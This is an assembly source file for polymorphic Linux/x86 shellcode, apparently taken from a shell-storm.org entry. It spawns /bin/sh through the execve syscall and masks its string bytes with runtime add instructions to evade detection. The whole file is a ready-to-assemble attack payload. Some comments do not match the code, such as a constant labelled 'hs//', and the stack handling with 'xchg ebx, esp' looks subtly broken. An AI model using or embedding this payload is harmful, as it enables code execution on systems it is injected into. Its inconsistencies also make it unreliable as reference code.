; Linux/x86 - execve /bin/sh shellcode
; Polymorphic version
; http://shell-storm.org/shellcode/files/shellcode-827.php
; shellcode length: 33 bytes

global _start

section .text

	_start:
		
	   	xor    eax,eax		; eax=NULL
    	   	push   eax		

		;push   0x46512f2f	; hs//	
		push word 0x4673
		push word 0x2f2f
		add word [esp+3] , 0x22

		;push   0x6e69622f	; nib/

		push 0x4c69622f
		add byte [esp+3] , 0x22

		;mov    ebx,esp		; /bin//sh null terminated
		xchg ebx , esp		; concept of tiny /bin/sh shell
		;push   eax			
		;push   ebx
		;mov    ecx,esp		; envp
		mov    al,0xb		; execve syscall
		int    0x80		; informs kernel for execution
					; execve("/bin/sh" , 0 , 0)
